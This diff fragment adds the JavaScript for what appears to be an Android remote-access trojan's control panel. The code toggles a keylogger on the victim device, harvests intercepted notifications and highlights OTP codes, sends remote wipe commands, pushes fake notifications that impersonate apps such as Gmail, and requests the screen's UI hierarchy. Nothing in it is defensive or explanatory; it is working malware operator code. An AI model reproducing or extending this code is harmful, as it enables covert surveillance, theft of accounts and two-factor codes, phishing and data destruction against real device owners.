+        <div class="text-xs text-muted" style="margin-top:.2rem">${fmt(e.timestamp || e.received_at)}</div>
+      `;
+      container.appendChild(div);
+    }
+    if (!container.querySelectorAll('.keylog-entry').length) {
+      document.getElementById('keylogEmpty').style.display = '';
+    }
+  }
+
+  document.getElementById('keylogRefresh').addEventListener('click', loadKeylogs);
+  document.getElementById('keylogToggle').addEventListener('click', () => {
+    keylogOn = !keylogOn;
+    ws.send({ type: 'command', deviceId, action: 'TOGGLE_KEYLOGGER' });
+    document.getElementById('keylogToggle').textContent = keylogOn ? 'Disable Keylog' : 'Enable Keylog';
+    document.getElementById('keylogToggle').className = keylogOn ? 'btn btn-danger btn-sm' : 'btn btn-primary btn-sm';
+    toast(keylogOn ? 'Keylogger enabled' : 'Keylogger disabled');
+  });
+
+  // ── Notifications ─────────────────────────────────────────────────────────
+  async function loadNotifs() {
+    try {
+      const res  = await fetch(`/api/device/${encodeURIComponent(deviceId)}/notifications`);
+      const list = await res.json();
+      const tbody = document.getElementById('notifsBody');
+      const otpOnly = document.getElementById('otpOnly').checked;
+      const filtered = otpOnly ? list.filter(n => n.is_otp) : list;
+      tbody.innerHTML = filtered.map(n => `
+        <tr>
+          <td class="truncate text-xs">${esc(n.package_name || '—')}</td>
+          <td class="truncate">${esc(n.title || '—')}</td>
+          <td class="truncate">${esc(n.body || '—')}</td>
+          <td>${n.is_otp ? `<span class="badge badge-yellow">${esc(n.otp_code)}</span>` : ''}</td>
+          <td style="white-space:nowrap" class="text-xs">${fmt(n.post_time || n.received_at)}</td>
+        </tr>
+      `).join('');
+    } catch {}
+  }
+
+  function appendNotif(n) {
+    const otp = n.otp_code || n.otpCode;
+    if (otp) toast(`🔑 OTP: ${otp} (${n.package_name || n.packageName || '?'})`, 'success');
+    loadNotifs();
+  }
+
+  document.getElementById('notifsRefresh').addEventListener('click', loadNotifs);
+  document.getElementById('otpOnly').addEventListener('change', loadNotifs);
+
+  // ── Commands ──────────────────────────────────────────────────────────────
+  document.querySelectorAll('.cmd-btn[data-cmd]').forEach(btn => {
+    btn.addEventListener('click', () => {
+      const action = btn.dataset.cmd;
+      if (action === 'WIPE_DEVICE') {
+        if (!confirm('⚠️ This will WIPE the device. Are you sure?')) return;
+      }
+      if (action === 'FAKE_NOTIFICATION' || action === 'TOAST_MSG') return; // handled separately
+      ws.send({ type: 'command', deviceId, action });
+      toast(`Sent: ${action}`);
+    });
+  });
+
+  document.getElementById('fakeNotifSend').addEventListener('click', () => {
+    ws.send({
+      type:        'command',
+      deviceId,
+      action:      'FAKE_NOTIFICATION',
+      packageName: document.getElementById('fakeNotifApp').value   || 'com.google.android.gm',
+      title:       document.getElementById('fakeNotifTitle').value || 'Notification',
+      body:        document.getElementById('fakeNotifBody').value  || '',
+    });
+    toast('Fake notification sent');
+  });
+
+  document.getElementById('toastMsgSend').addEventListener('click', () => {
+    const text = document.getElementById('toastMsgInput').value.trim();
+    if (!text) return;
+    ws.send({ type: 'command', deviceId, action: 'TOAST_MSG', message: text });
+    toast('Toast message sent');
+  });
+
+  // ── Hierarchy ─────────────────────────────────────────────────────────────
+  document.getElementById('hierarchyRequest').addEventListener('click', () => {
+    document.getElementById('hierarchySpinner').classList.remove('hidden');
+    document.getElementById('hierarchyPre').textContent = 'Requesting…';
+    ws.send({ type: 'command', deviceId, action: 'REQUEST_HIERARCHY' });
+  });
+
+})();
+</script>
+</body>
+</html>
